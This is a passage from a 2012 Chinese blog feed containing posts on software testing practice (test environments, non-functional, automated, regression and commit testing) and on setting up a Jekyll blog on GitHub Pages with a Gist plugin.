&lt;p&gt;以上的这些问题，都指向了一个关键点，测试环境的管理，分而细之，又包括几个重要的因素：变更、自动化、数据化、虚拟化、共享。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;虚拟化技术&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;虚拟化技术可以帮助将测试环境数据化，自动化，并借此达到重复利用的目的。虚拟化技术有很多，比较优秀的有&lt;a href=&quot;http://www.vmware.com/&quot;&gt;VMWare&lt;/a&gt;和&lt;a href=&quot;http://www.virtualbox.org/&quot;&gt;Virtual Box&lt;/a&gt;。比如，很多测试环境是寄生在操作系统中的，我们可以将这些操作系统做成操作系统基线，平时不需要测试时可以不开着，要用的时候再开。这些操作系统基线可以进行版本控制，因为文件比较大，用svn之类的管理可能会遇到一些问题，可以针对性设计一些大文件版本控制软件(比如：结合SVN和FTP的优点)。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;配置管理自动化&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;先后研究了几种配置管理的工具，Chef, CfEngine, puppet，最后用的比较多的是&lt;a href=&quot;http://www.opscode.com/chef/&quot;&gt;Chef&lt;/a&gt;。Chef比较好的一点是提供OpenSouce Chef Server，可以自己搭建服务器，也是这几个里面最先搭成功的，算是比较容易上手吧。就像一个大厨(Chef)使用刀(Knife)实验各种不同的菜单(Recipes)，制成各种食谱(CookBook)一样，一个配置管理工程师就是用它来制作不同的测试环境。 关于配置管理自动化方面的知识，可以参考&lt;a href=&quot;http://book.douban.com/subject/6862062/&quot;&gt;《持续交付》&lt;/a&gt;第11章&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2012/03/devops.jpg&quot; alt=&quot;持续交付&quot; /&gt;&lt;/p&gt;

&lt;p&gt;参考资料:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://www.infoq.com/cn/articles/xl-microsoft-virtualization&quot;&gt;http://www.infoq.com/cn/articles/xl-microsoft-virtualization&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blogs.msdn.com/b/cheno/archive/2010/03/14/9978309.aspx&quot;&gt;http://blogs.msdn.com/b/cheno/archive/2010/03/14/9978309.aspx&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://wiki.opscode.com/display/chef/Home&quot;&gt;http://wiki.opscode.com/display/chef/Home&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

</content>
 </entry>
 
 <entry>
   <title>测试思考系列[5]：非功能性测试</title>
   <link href="http://hackfisher.github.com/blog/2012/04/thinking-in-test-non-functional-testing"/>
   <updated>2012-04-06T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/04/thinking-in-test-non-functional-testing</id>
   <content type="html">&lt;p&gt;非功能性测试是针对非功能性需求来说的。所谓&lt;a href=&quot;http://www.51testing.com/html/90/n-79290.html&quot;&gt;非功能性需求&lt;/a&gt;，是指软件产品为满足用户业务需求而必须具有且除功能需求以外的特性。软件产品的非功能性需求包括系统的性能、可靠性、可维护性、可扩充性和对技术和对业务的适应性等。下面对其中的某些指标加以说明。在这里可以看到非功能性需求涉及的范围很广，软件产品本身不是孤立存在的，还涉及到诸多外在环境的影响。非功能性需求必须考虑软件既要可用，又要易用。这篇文章主要介绍在非功能性方面的一些思考和实践，分为性能测试、兼容性测试、安全性测试、易用可用性测试。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;性能测试.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;性能测试主要分为性能报告和性能调优两个角度，但无论是从哪一个角度去做，最大的忌讳都是凭着感觉去猜，把90%的精力浪费在了10%不重要不是瓶颈的地方。&lt;/p&gt;

&lt;p&gt;首先需要确定用户的性能需求，比如有些功能的性能虽然很差，但是用户并不十分在意，比如定时执行任务功能等等，再比如首页页面显示功能，虽然只需要几秒就可出现，但是用户对它的要求是非常高的(&amp;lt;=1s)，这个就是用户对不同功能有着不同的性能需求。如果性能调优的时间浪费在用户没有性能需求的地方，产生的优化结果对于用户的性能体验来说并没有任何的改善。&lt;/p&gt;

&lt;p&gt;其次，一个重要的原则是，在做任何优化之前需要先profile一下性能瓶颈，切忌风风火火的优化，结果发现方向错了。有很多优秀的Profiler工具，比如&lt;a href=&quot;http://www.ej-technologies.com/products/jprofiler/overview.html&quot;&gt;JProfiler&lt;/a&gt;和&lt;a href=&quot;http://www.yourkit.com/&quot;&gt;YourKit&lt;/a&gt;，web前端优化方面，FireBug的概况和网络功能很不错。&lt;/p&gt;

&lt;p&gt;在并发测试和疲劳强度测试方面，不得不提的工具是LoadRunner。关于LoadRunner和并发测试知识的介绍，推荐看看Jackei的&lt;a href=&quot;http://www.cnblogs.com/jackei/archive/2006/11/11/557972.html&quot;&gt;《LoadRunner没有告诉你的系列》&lt;/a&gt;，尤其是里面的&lt;a href=&quot;http://www.cnblogs.com/jackei/archive/2006/11/20/565527.html&quot;&gt;理发店模型&lt;/a&gt;，通俗易懂，性能测试入门者必看。并发测试的优化方面，关于结果缓存的优化，特别是那种执行得出结果需要较长时间的过程，Java并发包的Future.get()是一个很不错的面向对象的概念，具体的详细介绍请参考《Java Concurrency in Practice》一书的5.6章节: Building an Efficient, Scalable Result Cache。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2012/04/java_concurrency.jpg&quot; alt=&quot;Java Concurrency in Practice&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Web前端性能测试方面，也有很多优化的技巧，如果你用的是Jquery，&lt;a href=&quot;http://www.artzstudio.com/2009/04/jquery-performance-rules/&quot;&gt;这篇文章&lt;/a&gt;总结的不错，尤其是第一条, Always Descend From an #id， 在我之前的&lt;a href=&quot;http://hackfisher.info/blog/2011/01/jquery-performance-profile/&quot;&gt;JQuery性能分析&lt;/a&gt;这篇文章里面有过详细介绍。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;兼容性测试.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;向后兼容性指硬件和软件系统可以使用该系统的早期版本的接口和数据。向后兼容性考虑的是对接口的变更如何影响接口的现有用户（也称为服务使用者）。如果现有用户不受影响，则变更就是向后兼容的。如果现有用户受到影响，则变更不向后兼容，将需要使用策略来管理变更的影响。&lt;/p&gt;

&lt;p&gt;兼容性测试的关键点在于分清楚设计成兼容和设计成不兼容，这个是测试人员主要关注的点。在有兼容性报告之前，用户经常会发现一个功能不能用了，以为是BUG，其实是设计成不兼容的，又没有相应的文档告知。&lt;/p&gt;

&lt;p&gt;就像程序员之间经常流传的一个笑话一样：It's not a bug, it's a feature. 感觉上，像是测试人员给设计人员背了黑锅，明明是设计的垃圾，导致增增减减修修补补，反正设计成不兼容到最后都反馈不到设计人员头上，都认为是测试人员的问题。但实际上，测试人员本身没有责任吗，可不可以做的更多使情况往更好的方向发展？ 其实测试只需要将反馈流弥补通，将不兼容的后果反馈给设计人员，产品设计也可以从用户身上学到更多，自然会对兼容性问题更谨慎一点，而测试本身通过兼容性报告也对产品发布的影响有了更多了解，还可以顺带帮文档把升级指南给做了。采用兼容性报告前后，对比各种兼容性问题造成的影响来看，兼容性报告效果明显。&lt;/p&gt;

&lt;p&gt;与兼容性相关的就是发布的版本号，兼容性可能导致的一个问题在软件管理中叫做&lt;a href=&quot;http://en.wikipedia.org/wiki/Dependency_hell&quot;&gt;dependency hell&lt;/a&gt;，随着系统越来越大，越来越复杂，这个问题会越来越严重。于是有人想出了解决办法，通过规范版本号，叫做&lt;a href=&quot;http://semver.org/&quot;&gt;Semantic Versioning&lt;/a&gt;。作者&lt;a href=&quot;http://tom.preston-werner.com/&quot;&gt;preston-werner&lt;/a&gt;是github.com的创始人之一。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;安全性测试.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;安全性在中国正在受到越来越多的重视，比如前段时间闹得沸沸扬扬的&lt;a href=&quot;http://article.pchome.net/content-1481119.html&quot;&gt;CSDN密码泄密门&lt;/a&gt;，相应的安全性测试也会越来越受重视。常见的SQL注入等漏洞可以借助于&lt;a href=&quot;http://www-01.ibm.com/software/awdtools/appscan/&quot;&gt;AppScan&lt;/a&gt;这类安全性测试工具检测出来。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;易用可用性测试.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;易用性测试报告除了可以对发布的产品信息了解更充分的作用外，还可以作为资料反馈给产品组，用户改进用户体验和产品易用性。测试组成员作为“产品发布前使用产品最多的人”，所以“易用性测试报告”应该成为 用户体验改进和易用性改进的重要依据。&lt;/p&gt;

&lt;p&gt;参考资料:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://www.uml.org.cn/zjjs/200609185.htm#1&quot;&gt;http://www.uml.org.cn/zjjs/200609185.htm#1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://hackfisher.info/blog/2011/01/jquery-performance-profile/&quot;&gt;http://hackfisher.info/blog/2011/01/jquery-performance-profile/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/jackei/archive/2006/11/20/565527.html&quot;&gt;http://www.cnblogs.com/jackei/archive/2006/11/20/565527.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.artzstudio.com/2009/04/jquery-performance-rules/&quot;&gt;http://www.artzstudio.com/2009/04/jquery-performance-rules/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

</content>
 </entry>
 
 <entry>
   <title>Gist Tag For Jekyll, 将Gist和Jekyll集成起来</title>
   <link href="http://hackfisher.github.com/blog/2012/03/gist-tag-for-jekyll"/>
   <updated>2012-03-31T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/03/gist-tag-for-jekyll</id>
   <content type="html">&lt;p&gt;GitHub有一个很好的功能&lt;a href=&quot;https://gist.github.com/&quot;&gt;Gist&lt;/a&gt;，可以收集和分享代码片段。自己写博客的时候也经常会需要在博客中嵌入代码片段，于是在想是否可以将这两个结合起来。&lt;/p&gt;

&lt;p&gt;网上搜到一个&lt;a href=&quot;http://brandontilley.com/2011/01/30/gist-tag-for-jekyll.html&quot;&gt;教程&lt;/a&gt;，按照他写的插件基本上就可以直接重用了，但是在这个过程中遇到几个问题：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;GitHub Pages处于安全性的考虑&lt;a href=&quot;http://stackoverflow.com/questions/8646744/jekyll-plugin-not-working&quot;&gt;不支持自定义插件&lt;/a&gt;
但是你别着急，还有有别的办法的，因为Jekyll生成的静态页面，所以也可以采取在本地用插件生成静态页面，然后再上传的&lt;a href=&quot;http://charliepark.org/jekyll-with-plugins/&quot;&gt;办法&lt;/a&gt;。
方法有很多，我使用的方法来自于这个&lt;a href=&quot;http://arademaker.github.com/blog/2011/12/01/github-pages-jekyll-plugins.html&quot;&gt;教程&lt;/a&gt;，就是将工程分为两个branch: source和master，因为git的切换比较方便。
官方运行的jekyll命令其实是:
  $ jekyll --pygments --safe&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;本地运行jekyll的时候无法编译，&lt;a href=&quot;https://github.com/mojombo/jekyll/wiki/Plugins&quot;&gt;插件&lt;/a&gt;不起作用, &lt;a href=&quot;https://github.com/mojombo/jekyll/issues/527&quot;&gt;issue&lt;/a&gt;
最开始的原因找了好久，后来发现将site.safe属性设置为false就行了，官方的wiki竟然没有说明，GitHub也是用参数 --safe来禁用插件的。
但是这边有一个问题，如果你是从jekyllbootstrap项目clone过来的话，将safe设置为false会&lt;a href=&quot;https://github.com/plusjade/jekyll-bootstrap/issues/53&quot;&gt;导致Google Analytics失效&lt;/a&gt;
如果想同时用插件，又想用Google Analytis的话就冲突了，需要改一下 _includes\JB\analytics文件，将里面的site.safe条件判断去掉。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;下面的代码片段是插件的内容，也是我用这个办法，Gist 和 Jekyll集成的效果:&lt;/p&gt;

&lt;script src='https://gist.github.com/2258459.js?file=gist_tag.rb'&gt;&lt;/script&gt;


&lt;p&gt;&lt;noscript&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;You are being &amp;lt;a href=&amp;quot;https://gist.github.com/HackFisher/2258459/raw/gist_tag.rb&amp;quot;&amp;gt;redirected&amp;lt;/a&amp;gt;.&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/noscript&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>测试思考系列[4]：测试自动化</title>
   <link href="http://hackfisher.github.com/blog/2012/03/thinking-in-test-automatization"/>
   <updated>2012-03-30T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/03/thinking-in-test-automatization</id>
   <content type="html">&lt;p&gt;测试自动化是把以人为驱动的测试行为转化为机器执行的一种过程。通常，测试用例按照执行对象分为手动测试和自动化测试。手动测试往往面临人力消耗巨大，测试效率很低的问题。而自动化测试便是为了解决这些问题提出的概念。&lt;/p&gt;

&lt;p&gt;自动化测试相对手动测试来说有很多优点：
- 1) 充分利用时间资源。&lt;/p&gt;

&lt;p&gt;一般无论什么公司，员工的上班时间只有8个小时，那么一天中除去这8个小时的其他时间，比如夜晚的时间，如果不利用起来，那简直是巨大的浪费，而机器是不需要休息的，即使半夜也可以工作，所以测试自动化可以充分的利用时间资源。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;2) 节省人力资源&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;即使在以人力资源占优势的中国来说，人力资源的成本也是处于不断的上升过程之中，相应的带来的也是手动测试成本的不断上升。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;3) 从某种角度，软件本身就是为了让过程自动化，所以软件从业人员在自动化方面有知识优势。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;4) 手动测试一般很枯燥，难逃测试效果降低厄运，而自动化测试更加可以严格的执行测试用例脚本。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;人的价值相对于机器来说，优势在于创造性，所以更应该将精力花在能够充分花费这一优势的地方，比如探索新测试(ET)，而将那些机械的测试用例脚本交给自动化测试。人的精力可以花在怎么去管理机器和创建维护脚本方面。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;5) 持续交付的需要&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;在做简单和机械的事情上，计算机的效率和人的效率不是一个数量级的，所以如果要满足持续交付的需要，缩短反馈的时间，需要让机器来帮助提高效率。&lt;/p&gt;

&lt;p&gt;不过，虽然自动化测试有这么多优点，但不是所有情况都适合做做自动化测试，如果不考虑好一下一些因素，轻易的自动化可能会导致陷入维护自动化脚本的泥潭，导致成本效用比很低：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;1) 软件需求变动不频繁。
　　测试脚本的稳定性决定了自动化测试的维护成本。如果软件需求变动过于频繁，测试人员需要根据变动的需求来更新测试用例以及相关的测试脚本，而脚本的维护本身就是一个代码开发的过程，需要修改、调试，必要的时候还要修改自动化测试的框架，如果所花费的成本不低于利用其节省的测试成本，那么自动化测试便是失败的。项目中的某些模块相对稳定，而某些模块需求变动性很大。我们便可对相对稳定的模块进行自动化测试，而变动较大的仍是用手工测试。举个例子，一般来说，UI是产品中经常变化的部分，因为用户对UI的需求变化太频繁了，而不像一些核心的业务流程一般会比较稳定。所以在UI上投入太多的精力做自动化测试需要谨慎考虑。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;2) 项目周期足够长。
　　自动化测试需求的确定、自动化测试框架的设计、测试脚本的编写与调试均需要相当长的时间来完成，这样的过程本身就是一个测试软件的开发过程，需要较长的时间来完成。如果项目的周期比较短，没有足够的时间去支持这样一个过程，那么自动化测试便成为笑谈。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;3) 自动化测试脚本可重复使用。
　　如果费尽心思开发了一套近乎完美的自动化测试脚本，但是脚本的重复使用率很低，致使其间所耗费的成本大于所创造的经济价值，自动化测试便成为了测试人员的练手之作，而并非是真正可产生效益的测试手段了。
　　另外，在手工测试无法完成，需要投入大量时间与人力时也需要考虑引入自动化测试。比如性能测试、配置测试、大数据量输入测试等。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;有很多自动化测试用具，比如QTP, WinRunner什么的。这篇文章着重介绍一下Web自动化测试方面的&lt;a href=&quot;http://seleniumhq.org/&quot;&gt;Selenium&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;Selenium也是一个用于Web应用程序测试的工具。Selenium 测试直接运行在浏览器中，就像真正的用户在操作一样。支持的浏览器包括IE,Mozilla和Firefox等。这个工具的主要功能包括：测试与浏览器的兼容性--测试你的应用程序看是否能够很好得工作在不同浏览器和操作系统之上。测试系统功能--创建衰退测试检验软件功能和用户需求。 支持自动录制动作，和自动生成。Net、Java、Perl等不同语言的测试脚本。Selenium 是 ThoughtWorks 专门为 Web 应用程序编写的一个验收测试工具。&lt;/p&gt;

&lt;p&gt;具体的Selenium脚本的编写方面的知识就不详细介绍了，本文着重介绍一下使用Selenium进行Web自动化测试的框架，包括 Selenium IDE, Hudson任务运行脚本, 自动推送热部署至Alpha， Selenium Grid扩展控制等等。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2012/03/deployment.png&quot; alt=&quot;基于Selenium的web自动化测试框架图&quot; /&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>使用Jekyll将博客从WordPress迁移至GitHub</title>
   <link href="http://hackfisher.github.com/blog/2012/03/blog-migrate-to-github"/>
   <updated>2012-03-29T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/03/blog-migrate-to-github</id>
   <content type="html">&lt;p&gt;Jekyll是一个使用Ruby编写的静态站点生成工具，使用Liquid模板渲染引擎，支持Markdown和Textile标记语言，并且可以为所有以 .html、.markdown、.textile扩展名结尾的件使用YAML配置，内置语法高亮功能。而Github的Pages服务可以为每个Github主机上的仓库提供静态页面服务，并且Pages服务支持Jekyll。因为Github Pages有两种Pages，分别是用户页面和项目页面，所以我们可以使用用户页面来创建自己的Blog。&lt;/p&gt;

&lt;p&gt;用GitHub的好处就有很多了,比如版本控制,比如免费空间,又比如支持CNAME设置自定义域名。&lt;/p&gt;

&lt;p&gt;首先,申请一个GitHub帐号，正确配置Git。创建你的Blog仓库username(请确保和你的帐号名相同).github.com。这方面具体的tutorial可以参见&lt;a href=&quot;pages.github.com&quot;&gt;pages.github.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;利用&lt;a href=&quot;jekyllbootstrap.com&quot;&gt;jekyllbootstrap&lt;/a&gt;可以帮助你一步一步的创建最原始的库,可以参考其教程,并且jekyllbootstrap还提供了一些风格供选择。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/plusjade/jekyll-bootstrap.git USERNAME.github.com
$ cd USERNAME.github.com
$ git remote set-url origin git@github.com:USERNAME/USERNAME.github.com.git
$ git push origin master
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;相信很多人原先都是用的WordPress来搭建博客，那么很自然的，就遇到一个问题，如何将原先WordPress中的文章迁移到GitHub中来。jekyll很贴心的提供了一个&lt;a href=&quot;https://github.com/mojombo/jekyll/wiki/blog-migrations&quot;&gt;教程&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;jekyll还有一个很好的地方就是，可以本地预览，预览地址默认为 127.0.0.1:4000&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; jekyll --server
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这才是&lt;a href=&quot;http://tom.preston-werner.com/2008/11/17/blogging-like-a-hacker.html&quot;&gt;Hacker写博客&lt;/a&gt;的方式!&lt;/p&gt;

&lt;div style=&quot;margin-top:20px&quot;&gt;参考资料：&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://pages.github.com/&quot;&gt;http://pages.github.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/mojombo/jekyll/wiki&quot;&gt;https://github.com/mojombo/jekyll/wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://taberh.me/2011/12/26/use-Jekyll-build-Blog-on-Github.html/&quot;&gt;http://taberh.me/2011/12/26/use-Jekyll-build-Blog-on-Github.html/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://jekyllbootstrap.com/&quot;&gt;http://jekyllbootstrap.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/HackFisher/hackfisher.github.com&quot;&gt;https://github.com/HackFisher/hackfisher.github.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</content>
 </entry>
 
 <entry>
   <title>测试思考系列[3]：回归测试</title>
   <link href="http://hackfisher.github.com/blog/2012/03/thinking-in-test-regression-test"/>
   <updated>2012-03-23T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/03/thinking-in-test-regression-test</id>
   <content type="html">&lt;strong&gt;&lt;a title=&quot;回归测试&quot; href=&quot;http://baike.baidu.com/view/106720.htm&quot; target=&quot;_blank&quot;&gt;回归测试&lt;/a&gt;&lt;/strong&gt;在百度百科上面的描述感觉还蛮准确，引用如下：
&lt;blockquote&gt;回归测试是指修改了旧代码后，重新进行测试以确认修改没有引入新的错误或导致其他代码产生错误。自动回归测试将大幅降低系统测试、维护升级等阶段的成本。回归测试作为软件生命周期的一个组成部分，在整个软件测试过程中占有很大的工作量比重，软件开发的各个阶段都会进行多次回归测试。在渐进和快速迭代开发中，新版本的连续发布使回归测试进行的更加频繁，而在极端编程方法中，更是要求每天都进行若干次回归测试。因此，通过选择正确的回归测试策略来改进回归测试的效率和有效性是非常有意义的。&lt;/blockquote&gt;
因为需求功能不断变化，产品也会跟着变，所以测试用例库则免不了需要&lt;strong&gt;维护&lt;/strong&gt;工作，而维护主要也是指的增删改查(CRUD)。
&lt;ul&gt;
	&lt;li&gt;测试用例的收集和添加，具体实践中的一种方式是与BUG跟踪系统结合起来， 每个模块有测试人员与之对应，那么在实现需求或者修复BUG的过程中，就可以添加测试用例了。基于这样一种理念，如果容易出BUG，说明那个地方就容易出问题，所以用测试用例覆盖的话价值会高一点。而新的需求，则是基于覆盖新的功能，特别是原先没有进行回归测试，功能已经比较完善的情况下，这种方式用的比较多一点。&lt;/li&gt;
	&lt;li&gt;查询和搜索是肯定需要的，因为进行回归测试之前需要选择回归测试包。在软件生命周期中，即使一个得到良好维护的测试用例库也可能变得相当大，这使每次回归测试都重新运行完整的测试包变得不切实际。一个完全的回归测试包括每个基线测试用例，时间和成本约束可能阻碍运行这样一个测试，有时测试组不得不选择一个缩减的回归测试包来完成回归测试。&lt;/li&gt;
	&lt;li&gt;修改的情况，主要是因为需求变更，或者旧的功能被删除，则测试用例要与需求同步&lt;/li&gt;
	&lt;li&gt;删除的测试用例，同上，具体实践时，可以采用增加测试用例状态D来实现，想法来源于Windows的垃圾回收箱。&lt;/li&gt;
&lt;/ul&gt;
&lt;a href=&quot;/uploads/2012/03/regression.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-338&quot; title=&quot;regression&quot; src=&quot;/uploads/2012/03/regression.png&quot; alt=&quot;&quot; width=&quot;640&quot; height=&quot;252&quot; /&gt;&lt;/a&gt;

&lt;strong&gt;迭代式开发&lt;/strong&gt;，就是以一段时间为一个周期，将一些任务打包分配并完成，当这些任务完成后再完成下面一批的打包任务，而不是像原来那样随意的抽取研发任务，迭代式开发计划性更强，更容易产生周期性的反馈。并且迭代式开发还有一个好处是，这样可以按迭代跑回归测试，至少每个迭代跑一次。

在实际工作中，回归测试需要反复进行，当测试者一次又一次地完成相同的测试时，这些回归测试将变得非常令人厌烦，而在大多数回归测试需要手工完成的时候尤其如此，因此，需要通过自动测试来实现重复的和一致的回归测试。
&lt;ul&gt;
	&lt;li&gt;自动测试，目前实践中比较成熟的是Web自动化测试，常见的工具主要是Selenium，这个会在后面的自动测试系列文章中介绍。&lt;/li&gt;
	&lt;li&gt;手动测试，这个就比较常见了，主要是基于ST(Script Based Test)。不像自动测试如单元测试只有两种状态：红(Failure)，绿(Pass)，手工测试的测试用例状态主要有三种： 通过(Pass), 待测试(O)，不通过(Failure)。因为手工测试从有希望知道测试用例是否通过的需要起，有很多测试用例需要很长时间才能知道测试用例是否通过，这段时间内，测试用例就是待测试O。所以，每次开始手动回归测试最基本的就是将所有的Pass改成O状态，而手工回归测试结束的简单标志就是 测试包中状态为O的测试用例数量归零。&lt;/li&gt;
&lt;/ul&gt;
&lt;strong&gt;回归测试的成本效用分析&lt;/strong&gt;

基于ST的手工回归测试有一个很大的问题就是手工测试的成本非常巨大，手工测试的成本就是人力成本，而现在的人力成本本身就很巨大，有人曾提过设想找一些实习生，像操作工人一样来测试，不谈现实的人力成本，这样做有一个严重的问题，就是再不懂需求的前提下测试相当于没有测试。并且还有另外一个很严重的问题就是ST会非常的枯燥，基本上就是按照步骤机械的操作和验证，测试者很容易感到疲劳和厌倦，测试效率随即降低。在回归测试用例库的初级阶段，大概有两千左右的测试用例脚本，实践中预测大概需要30个人天。而一次回归测试的效用就是对这一次迭代带来的变更修改，验证所有其他的产品模块，效用并不理想，但是回归测试不可或缺。

所以，回归测试的&lt;strong&gt;关键策略&lt;/strong&gt;在于兼顾成本和效率效用两方面，常用的有如下一些：
&lt;ul&gt;
	&lt;li&gt;因为测试用例之间存在依赖关系，那么就可以建立前置条件(一个测试用例是另外一个测试用例的前置)，利用这种依赖，基于分层的思想，慢慢的将测试用例库进化演变成不同的层次，就像自然界有不同层次的食物链一样的。越是重要和频繁使用的测试用例，比如冒烟测试用例库，就应该被越经常的跑。有了层次，就提供了更多了信息，帮助改进测试包缩减技术。&lt;/li&gt;
	&lt;li&gt;缩减技术，比如代码相依性分析、功能矩阵、基于风险的、基于严重程度的、基于主要/贡献功能等等&lt;/li&gt;
	&lt;li&gt;充分利用标签、分类信息&lt;/li&gt;
	&lt;li&gt;充分利用测试者的经验和能力，提高测试积极性，通过ST与探索性测试(ET)结合的方式进行测试，关于ET，后面会有系列文章进行介绍。探索性测试，在一些其他的公司已经得到了实践验证，比较好的书可以看看大牛James A.Whittaker的 &lt;a title=&quot;探索式软件测试&quot; href=&quot;http://book.douban.com/subject/4818689/&quot; target=&quot;_blank&quot;&gt;《探索式软件测试》&lt;/a&gt;。&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>测试思考系列[2]：提交测试</title>
   <link href="http://hackfisher.github.com/blog/2012/03/thinking-in-test-commit-test"/>
   <updated>2012-03-19T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/03/thinking-in-test-commit-test</id>
   <content type="html">&amp;nbsp;

对于开发活动来说，代码提交是一个很重要的事件，代码变更被提交到版本控制服务器后(成为一次revision)，意味着该变更的影响范围从该开发人员自己推广到了更广阔的范围：

&amp;nbsp;
&lt;ul&gt;
	&lt;li&gt;其他开发人员将可以通过update代码将该变更合并到自己的变更中去，影响到其他开发人员的修改；&lt;/li&gt;
	&lt;li&gt;测试人员将可以从版本控制服务器上通过构建并得到结果，对合并该变更后的产品进行测试；&lt;/li&gt;
	&lt;li&gt;其他的试用，需求验收人员都可以看到该变更的变化和影响，如果在开发环境中看，则太麻烦了，对于不懂技术的人来说门槛太高。&lt;/li&gt;
	&lt;li&gt;因为持续集成意味着“完成”即“以发布”，所以这次提交的变更很有可能会影响到最终使用这个产品的用户。&lt;/li&gt;
&lt;/ul&gt;
&amp;nbsp;

测试中有一个非常重要的经济学原则：&lt;strong&gt;产品问题或者BUG被发现的越早，其被修复的成本就越低&lt;/strong&gt;。所以说，提交测试是一个非常重要和有价值的阶段，如果不能被充分利用起来那就太浪费了。更何况提交测试还可以为后续的其他测试需要的简单测试过的二进制的包，避免因为前置条件不满足而导致其他的测试，试用，验收活动无法展开。提交测试的特点是功能很基础，靠近开发过程容易被程序化(见下图)，需要被频繁的执行，这些特点决定了提交测试必然是自动化程度很高的，在实践中一般要求接近全部自动化(除了冒烟测试可能有手动外)。

&lt;a href=&quot;/uploads/2012/03/test-category.png&quot;&gt;
&lt;img class=&quot;aligncenter size-full wp-image-303&quot; title=&quot;test-category&quot; src=&quot;/uploads/2012/03/test-category.png&quot; alt=&quot;&quot; width=&quot;380&quot; height=&quot;269&quot; /&gt;&lt;/a&gt; 按照时间顺序，提交测试由一下一些部分组成： 开发环境构建&lt;strong&gt;&amp;gt;&amp;gt;&lt;/strong&gt;CodeReview&lt;strong&gt;&amp;gt;&amp;gt;&lt;/strong&gt;提交至SVN&lt;strong&gt;&amp;gt;&amp;gt;&lt;/strong&gt;提交后构建(包括编译，单元测试，代码检查etc.)&lt;strong&gt;&amp;gt;&amp;gt;&lt;/strong&gt;自动推送部署至Alpha测试场所(Alpha安装包，Update工具，Alpha FTP, Alpha应用) &lt;strong&gt;&amp;gt;&amp;gt;&lt;/strong&gt; 每日冒烟测试

下面将按照提交测试的这些次序，介绍各项实践：
一. CodeReview
